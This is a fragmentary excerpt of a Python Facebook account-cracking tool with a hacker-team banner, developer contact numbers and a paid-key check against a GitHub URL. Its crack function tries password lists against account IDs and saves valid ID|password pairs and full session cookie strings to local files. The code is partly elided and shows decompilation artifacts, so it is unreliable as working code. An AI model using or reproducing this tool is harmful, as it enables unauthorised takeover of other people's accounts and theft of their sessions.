...
def banner():
	print('\x1b[1;92m\n	 \t\x1b[1;91m888888ba  dP 888888ba   .88888.  dP    dP\n	 \t\x1b[1;90m88    `8b 88 88    `8b d8'   `8b Y8.  .8P\n	 \t\x1b[1;93ma88aaaa8P' 88 88     88 88     88  Y8aa8P\n	 \t\x1b[1;94m88   `8b. 88 88     88 88     88    88\n	 \t\x1b[1;97m88     88 88 88    .8P Y8.   .8P    88\n	 \t\x1b[1;92mdP     dP dP 8888888P   `8888P'     dP\n\n ┌──────────────────────────────────────────────────────┐\n │[✓] DEVOLPER   :			ABUBOCKOR RIYAD [RR]	  │\n │[✓] WHATSAPP   :			+8801710375092			│\n │[✓] GITHUB	 :			RR-HACKER-RIYAD		   │\n │[✓] TOOLS	  :			RRK-FILE-CLONING		  │\n │[✓] TEAM	   :			RRK					   │\n └──────────────────────────────────────────────────────┘\n	\n	\t \x1b[47m\x1b[1;31mTHE TOOL WILL BE UPDATED EVERY SEVEN DAYS\x1b[40m\x1b[00m\n		   ')
...
def notice():
	...
	time.sleep(2)
	os.system('am start https://wa.me/+8801647393683')
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Ridoy-RD-Hacker/text/main/Dis').text
			if basesplit in plr:
				key = basesplit
				stat = '\x1b[0;92mPAID'
				FY = '\x1b[0;93m'
...
def crack(idf, pwv):
	...
	(sys.stdout.write(f"\r{b}RD_CRACK{P} [{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop / float(len(id)))}{P}]  "),)
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				...
				print('')
				print('\x1b[1;92m══════════════════════════════════════════')
				print('\x1b[1;91m[✓] STATUS		: \x1b[1;96mRD_CP🥀')
				...
				print('')
				print('\x1b[1;91m══════════════════════════════════════════')
				print('\x1b[1;92m[✓] STATUS		: \x1b[1;96mRD_OK💚')
		...
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, 'RD CP', **('title',)))
					open('RD_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				headapp = {
		...
		try:
			...
			if 'checkpoint' in po.cookies.get_dict().keys() or 'ya' in oprek:
				...
				if 'ya' in princp:
					...
					statuscp = f'''[•] ID	   : {idf} [•] PASSWORD : {pw}'''
					statuscp1 = nel(statuscp, 'red', **('style',))
					cetak(nel(statuscp1, 'RD_CP', **('title',)))
					open('RD_CP.txt', 'a').write(idf + '|' + pw + '\n')
					akun.append(idf + '|' + pw)
					cp += 1
			elif 'c_user' in ses.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					coki = po.cookies.get_dict()
					kuki = ';'.join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items()])
					open('RD_OK.txt', 'a').write(idf + '|' + pw + '|' + kuki + '\n')
					print('\n')
					statusok = f'''[•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'''
					statusok1 = nel(statusok, 'green', **('style',))
					...
					statusok = f'''[bold green][•] ID	   : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'''
					statusok1 = nel(statusok, 'green', **('style',))
					cetak(nel(statusok1, '[bold green]RD_OK[/bold green]', **('title',)))
					ok += 1
				else:
					continue
			else:
